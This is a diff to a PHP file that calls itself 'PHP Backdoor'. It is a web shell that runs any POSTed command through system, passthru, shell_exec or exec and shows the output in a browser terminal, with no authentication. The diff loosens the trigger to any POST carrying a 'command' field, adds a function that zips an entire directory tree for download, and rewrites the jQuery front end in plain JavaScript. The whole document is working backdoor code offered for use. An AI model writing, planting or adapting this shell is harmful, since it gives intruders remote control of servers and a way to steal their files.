@@ -12,9 +12,7 @@
 	 Description: Web-based application that allows to execute terminal commands on a server directly from a browser
 	 Authors: Jarek <jarek@g3ck.com>, G3ck Dev Team <dev@g3ck.com
 	 Github: https://g3ck.github.io/PHP-Backdoor
-/
 	 License: MIT
-
 */
 // Get current command
 // if command posted
@@ -29,61 +27,101 @@ endif;
 function answer($data){
 	die(json_encode($data));
 }
-// Check if is ajax request. If yes, start terminal command
-if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'):
-	// Check functions
-	// Try: system
-	if(function_exists('system'))
+
+function archive($path){
+
+	// Get real path for our folder
+	$rootPath = $path;
+
+	// Initialize archive object
+	$zip = new ZipArchive();
+	$zip->open('file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
+
+	// Create recursive directory iterator
+	/** @var SplFileInfo[] $files */
+	$files = new RecursiveIteratorIterator(
+		new RecursiveDirectoryIterator($rootPath),
+		RecursiveIteratorIterator::LEAVES_ONLY
+	);
+
+	foreach ($files as $name => $file)
 	{
-		ob_start();
-		system($command , $return_var);
-		$output = ob_get_contents();
-		ob_end_clean();
-	}
-	// Try: passthru
-	else if(function_exists('passthru'))
-	{
-		ob_start();
-		passthru($command , $return_var);
-		$output = ob_get_contents();
-		ob_end_clean();
-	}
-	// Try: shell_exec
-	else if(function_exists('shell_exec'))
-	{
-		$output = shell_exec($command);
-	}
-	// Try: exec
-	else if(function_exists('exec'))
-	{
-		exec($command , $output , $return_var);
-		$output = implode("" , $output);
+		// Skip directories (they would be added automatically)
+		if (!$file->isDir())
+		{
+			// Get real and relative path for current file
+			$filePath = $file->getRealPath();
+			$relativePath = substr($filePath, strlen($rootPath) + 1);
+
+			// Add current file to archive
+			$zip->addFile($filePath, $relativePath);
+		}
 	}
 
-	// Try: terminal_exec
-	else if(function_exists('terminal_exec'))
-	{
-		$output = terminal_exec($command) ;
-	}
-	// No function exists
-	else
-	{
-		$output = 'Command execution not possible on this server';
-	}
-	// No output
-	if ($output == null):
-		$answer = array(
-			'Unknown command'
-		);
-		answer($answer);
-	// Create an answer
-	else:
-		$output = nl2br($output);
-		$answer = array(
-			$output
-		);
-		answer($answer);
-	endif;
+	// Zip archive will be created only after closing object
+	$zip->close();
+	$answer = array("Archive created");
+	answer($answer);
+}
+
+
+// Check if is ajax request. If yes, start terminal command
+if (isset( $_POST['command'])):
+
+	$command = $_POST['command'];
+
+		// Check functions
+		// Try: system
+		if(function_exists('system'))
+		{
+			ob_start();
+			system($command , $return_var);
+			$output = ob_get_contents();
+			ob_end_clean();
+		}
+		// Try: passthru
+		else if(function_exists('passthru'))
+		{
+			ob_start();
+			passthru($command , $return_var);
+			$output = ob_get_contents();
+			ob_end_clean();
+		}
+		// Try: shell_exec
+		else if(function_exists('shell_exec'))
+		{
+			$output = shell_exec($command);
+		}
+		// Try: exec
+		else if(function_exists('exec'))
+		{
+			exec($command , $output , $return_var);
+			$output = implode("" , $output);
+		}
+		// Try: terminal_exec
+		else if(function_exists('terminal_exec'))
+		{
+			$output = terminal_exec($command) ;
+		}
+		// No function exists
+		else
+		{
+			$output = 'Command execution not possible on this server';
+		}
+		// No output
+		if ($output == null):
+			$answer = array(
+				'Unknown command',
+			);
+			answer($answer);
+		// Create an answer
+		else:
+			$output = nl2br($output);
+			$answer = array(
+				$output
+			);
+			answer($answer);
+		endif;
 else:
 ?>
 <!doctype html>
@@ -98,113 +136,111 @@ else:
 	<meta name="author" content="Jarek, jarek@g3ck.com">
 	<meta name="author" content="Jarek, jarek@g3ck.com">
 	<meta name="owner" content="G3ck Dev Team, dev@g3ck.com">
-	<link href="https://fonts.googleapis.com/css?family=Roboto+Mono:100,300,400,500,700" rel="stylesheet">
 	<title>PHP Terminal [g3ck.com]</title>
 	<style>
-		* {
-			font-family: 'Roboto Mono', monospace
-		}
-		body,
-		html {
-			height: 100%;
-			background: #000;
-			font-size: 14px;
-			color: #fff;
-			padding: 0;
-			margin: 0;
-			overflow: hidden
-		}
 
-		body {
-			overflow-x: hidden;
-			overflow-y: auto
-		}
-
-		section#terminal {
-			margin: 15px
-		}
-
-		#console {
-			list-style: none;
-			padding: 0;
-			margin: 0
-		}
-
-		#console li {
-			position: relative;
-			width: 99%;
-			border: none;
-			color: #fff;
-			margin-bottom: 1px;
-			color: #1dff1d;
-			padding: 2px 0 2px 15px
-		}
-
-		#console li:not(.answer) {
-			cursor: pointer
-		}
-
-		#console li::before {
-			content: " ~ ";
-			position: absolute;
-			left: 0;
-			top: 1px;
-			color: green
-		}
-
-		#console li.answer {
-			color: #ffd623;
-			font-weight: 400
-		}
-
-		#console li.answer.error {
-			color: #ff2323
-		}
-
-		#input {
-			padding: 2px 0 2px 15px;
-			position: relative
-		}
-
-		#input::before {
-			content: " ~ ";
-			position: absolute;
-			left: 0;
-			top: 1px;
-			color: green
-		}
-
-		#input::before {
-			transition-property: transform;
-			transition-duration: 1s
-		}
-
-		#input.waiting::before {
-			animation-name: rotate;
-			animation-duration: 2s;
-			animation-iteration-count: infinite;
-			animation-timing-function: linear;
-			color: #fff
-		}
-
-		@keyframes rotate {
-			from {
-				transform: rotate(0)
+			* {
+				font-family: monospace
 			}
-			to {
-				transform: rotate(360deg)
+			body,
+			html {
+				height: 100%;
+				background: #000;
+				font-size: 15px;
+				color: #fff;
+				padding: 0;
+				margin: 0;
+				overflow: hidden;
 			}
-		}
 
-		#input #command {
-			width: 100%;
-			background-color: transparent;
-			border: none;
-			color: #fff;
-			font-size: 14px;
-			color: #fff;
-			font-family: 'Roboto Mono', monospace
-		}
+			body {
+				overflow-x: hidden;
+				overflow-y: auto
+			}
+			section#terminal {
+				margin: 15px
+			}
+
+			#console {
+				list-style: none;
+				padding: 0;
+				margin: 0
+			}
+
+			#console li {
+				position: relative;
+				width: 99%;
+				border: none;
+				color: #fff;
+				margin-bottom: 1px;
+				color: #1dff1d;
+				padding: 2px 0 2px 15px;
+				cursor: default !important;
+			}
+
+			#console li:not(.answer) {
+			}
+
+			#console li::before {
+				content: " ~ ";
+				position: absolute;
+				left: 0;
+				top: 1px;
+				color: green
+			}
+
+			#console li.answer {
+				color: #ffd623;
+				font-weight: 400
+			}
+
+			#console li.answer.error {
+				color: #ff2323
+			}
+
+			#input {
+				padding: 2px 0 2px 15px;
+				position: relative
+			}
+
+			#input::before {
+				content: " ~ ";
+				position: absolute;
+				left: 0;
+				top: 1px;
+				color: green
+			}
+
+			#input::before {
+				transition-property: transform;
+				transition-duration: 1s
+			}
+
+			#input.waiting::before {
+				animation-name: rotate;
+				animation-duration: 2s;
+				animation-iteration-count: infinite;
+				animation-timing-function: linear;
+				color: #fff
+			}
+			@keyframes rotate {
+				from {
+					transform: rotate(0)
+				}
+				to {
+					transform: rotate(360deg)
+				}
+			}
+			#input #command {
+				width: 100%;
+				background-color: transparent;
+				border: none;
+				color: #fff;
+				font-size: 15px;
+				color: #fff;
+				font-family: 'Roboto Mono', monospace
+			}
+
 	</style>
 </head>
 <body>
@@ -214,108 +250,92 @@ else:
 			<input id="command" type="text" value="">
 		</div>
 	</section>
-	<script
-		src="https://code.jquery.com/jquery-3.3.1.min.js"
-		integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
-		crossorigin="anonymous"></script>
 	<script>
 		// Log command into console
 		function log(input){
-			$("#console").append('<li>' + input + '</li>');
+			var div = document.getElementById('console');
+			div.innerHTML += '<li>' + input + '</li>';
 		}
 		// Create a answer log
 		function answer(input, type=''){
-			$("#console").append('<li class="answer ' + type + '">' + input + '</li>');
+			var div = document.getElementById('console');
+			div.innerHTML += '<li class="answer ' + type + '">' + input + '</li>';
 		}
 		// Welcome message
 		function welcome(){
-			$("#console").append('<li class="answer">PHP Backdoor by G3ck.com</li>');
-			$("#console").append('<li class="answer">Licensed under MIT License</li>');
+			var div = document.getElementById('console');
+			div.innerHTML += '<li class="answer">PHP Backdoor by G3ck.com</li>';
+			div.innerHTML += '<li class="answer">Licensed under MIT License</li>';
 		}
 		// Submit a command by jjax
 		function ajax(command){
-			$.ajax({
-				type: "POST",
-				dataType:"json",
-				// Location = file itself
-				url: window.location.href,
-				// Set command as post data
-				data: "command=" + command,
-				beforeSend: function (data) {
-					// Waiting for the answer - disable input
-					$("#input").addClass('waiting');
-					$("#command").prop('disabled', true);
-				},
-				// Success
-				success: function (data)
-				{
-					// Log answer in console
-					// Get answer array and log each line
-					$.each(data, function(i, item) {
-						answer(item) + ".";
-					});
-					// Enable input
-					setTimeout(function(){
-						$("#input").removeClass('waiting');
-						$("#command").prop('disabled', false);
-					},250);
-
-				},
-				// an error occures
-				error: function (data)
-				{
-					answer('unknow command', 'error') + ".";
-					setTimeout(function(){
-						$("#input").removeClass('waiting');
-						$("#command").prop('disabled', false);
-					},250);
-
+			var div = document.getElementById('console');
+			var xhttp = new XMLHttpRequest();
+		    xhttp.onreadystatechange = function() {
+		      if (this.readyState == 4 && this.status == 200) {
+				respond = this.responseText;
+				function IsJsonString(str) {
+				  try {
+				    var json = JSON.parse(str);
+				    return (typeof json === 'object');
+				  } catch (e) {
+				    return false;
+				  }
 				}
-			});
+				if (IsJsonString(respond)){
+						respond = JSON.parse(respond);
+				  //the json is ok
+				  for (var key in respond) {
+  				    if (respond.hasOwnProperty(key)) {
+  					   displayed = true;
+  				       answer(respond[key]);
+  				    }
+  				 }
+				}else{
+				  //the json is not ok
+				  answer('Unexpected response format');
+				}
+		      }
+
+		    };
+		    xhttp.open("POST", window.location.href, true);
+		    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		    xhttp.send("command=" + command);
 		}
 		// Get welcome message
 		welcome();
 		// Submit command
-		$("#command").on('keyup', function (e) {
-			var value = $("#command").val();
+		document.getElementById("command").addEventListener("keyup", function(e){
+			var valueThis = document.getElementById("command").value;
 			// On enter click
 			if (e.keyCode == 13) {
-				if (value != ''){
+				valueThis = valueThis.toLowerCase();
+				if (valueThis != ''){
 					// Log user command into console
-					log(value);
+					log(valueThis);
 					// Custom command
 					// Clear terminal screan
-					if (value == 'cls'){
-						$("#console").html('');
+					if (valueThis == 'cls'){
+						document.getElementById("console").innerHTML = '';
 					// Reset terminal
-					} else if (value == 'reset'){
-						$("#console").html('');
+					} else if (valueThis == 'reset' || valueThis == 'res'){
+						document.getElementById("console").innerHTML = '';
 						welcome();
+					// Hello
+					} else if (valueThis == 'hello' || valueThis == 'hi'){
+						answer('Hello')
+					// Response
 					} else{
-						ajax(value);
+						ajax(valueThis);
 					}
-					// Scroll terminal to bottom
-					$("html, body").animate({ scrollTop: $(document).height() }, "slow");
-					$("#command").val('');
+					window.scrollTo(0,document.body.scrollHeight);
+					document.getElementById("command").value = '';;
 				}
 				return false;
 			}
 		});
-		$("#command").val('');
-		// Copy clicked command
-		$(document).on('click','#console li:not(.answer)',function(e) {
-			$("#command").val($(this).html());
-		});
-		// Focus command input
-		$(window).click(function() {
-			$("#command").focus();
-		});
-		// Focus command every 0.5 minute
-		$(document).ready(function() {
-			setTimeout(function(){
-					$("#command").focus();
-			}, 500);
-		});
+	document.getElementById("command").value = '';
+	setInterval(function(){ document.getElementById("command").focus(); }, 500);
 	</script>
 </body>
 </html>
